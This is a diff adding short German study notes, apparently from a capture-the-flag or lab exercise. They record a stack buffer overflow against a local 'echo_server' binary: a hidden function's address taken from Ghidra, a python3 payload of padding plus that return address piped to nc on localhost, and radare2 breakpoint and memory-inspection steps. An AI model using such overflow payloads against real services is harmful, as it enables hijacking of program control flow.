@@ -1,0 +1,28 @@
+
+Adresse geheime Funktion(Ghidra):
+004009b0
+\xb0\x09\x40\x00\x00
+
+Nachricht mit bof Angriff:
+python3 -c 'print("A"*326+"\x00\xb0\x09\x40\x00\x00\x00\x00\x00\x00")' | nc localhost 44444
+
+
+Vorgehen Debugging:
+
+r2 -d ./echo_server
+aaa
+af @ 0x400af3
+afl
+pdf @ main
+pdf @ fcn.00400af3
+db 0x00400b27
+db 0x00400b31
+dc
+
+anderer Tab -> python3 -c 'print("A"*326+"\x00\xb0\x09\x40\x00\x00\x00\x00\x00\x00")' | nc localhost 44444
+
+px @ rsi
+px @ 0x7fffffffddf0
+dc
+px @ 0x7fffffffddf0
+dc
